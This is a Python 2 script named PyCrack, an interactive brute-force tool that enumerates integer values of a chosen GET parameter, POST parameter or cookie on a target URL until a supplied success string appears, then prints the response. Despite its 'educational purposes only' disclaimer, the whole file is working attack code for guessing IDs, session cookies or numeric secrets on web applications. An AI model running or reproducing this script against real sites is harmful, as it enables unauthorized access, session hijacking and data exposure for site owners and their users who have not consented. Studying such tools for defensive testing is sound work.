'''
This was written for educational purposes only.
Make sure you have written permission before using it on any web application.
This script is licensed under the MIT license.

If you would like to make this script better https://github.com/rashidx/PyCrack
'''


import urllib
import urllib2

def welcome_msg():
    print '|-------------------------------------------------------|'
    print '|          W E L C O M E   T O   P Y C R A C K          |'
    print '|                   created by rashidx                  |'
    print '|-------------------------------------------------------|'

def prompt(msg, error_msg):
    while True:
        prompt = raw_input(str(msg)+': ')
        if prompt == '':
            print 'ERROR: '+str(error_msg)+'!'
        else:
            break
    return prompt.lower()

def get_attack(url, string):
    name = prompt('Please enter the name of the GET parameter', 'An empty name is not allowed')
    print '[+] Attack started!'
    n = 0
    while True:
        print '[+] Trying '+str(name)+' = '+str(n)
        response = urllib2.urlopen(str(url)+'?'+str(name)+'='+str(n)).read()
        if string.lower() in response.lower():
            print '[+] Attack Successfull! Success string found when '+str(name)+' = '+str(n)
            answer = prompt('Should we print the response here? (Yes / No)', 'A')
            if answer == 'yes':
                print '\n## RESPONSE ##\n\n'+response
            break
        n = n+1
    return

def post_attack(url, string):
    name = prompt('Please enter the name of the POST parameter', 'An empty name is not allowed')
    print '[+] Attack started!'
    n = 0
    while True:
        print '[+] Trying '+str(name)+' = '+str(n)
        values = {name : n}
        data = urllib.urlencode(values)
        req = urllib2.Request(url, data)
        response = urllib2.urlopen(req).read()
        if string.lower() in response.lower():
            print '[+] Attack Successfull! Success string found when '+str(name)+' = '+str(n)
            answer = prompt('Should we print the response here? (Yes / No)', 'A')
            if answer == 'yes':
                print '\n## RESPONSE ##\n\n'+response
            break
        n = n+1
    return

def cookie_attack(url, string):
    name = prompt('Please enter the name of the Cookie', 'An empty cookie name is not allowed')
    print '[+] Attack started!'
    n = 0
    while True:
        print '[+] Trying '+str(name)+' = '+str(n)
        opener = urllib2.build_opener()
        opener.addheaders.append(('Cookie', str(name)+'='+str(n)))
        response = opener.open(url).read()
        if string.lower() in response.lower():
            print '[+] Attack Successfull! Success string found when '+str(name)+' = '+str(n)
            answer = prompt('Should we print the response here? (Yes / No)', 'A')
            if answer == 'yes':
                print '\n## RESPONSE ##\n\n'+response
            break
        n = n+1
    return

def get_options():
    url = prompt('Please enter the URL (with a trailing slash if needed)', 'Empty URLs are not allowed')
    string = prompt('Please enter the success string', 'Empty success strings are not allowed')
    while True:
        vector = raw_input('Please choose an attack vector (GET, POST, COOKIE): ')
        if vector.lower() == 'get':
            get_attack(url, string)
            break
        elif vector.lower() == 'post':
            post_attack(url, string)
            break
        elif vector.lower() == 'cookie':
            cookie_attack(url, string)
            break
        else:
            print 'ERROR: Invalid attack vector!'
def main():
    welcome_msg()
    get_options()
    print '\n## Script Ended ##'

main()
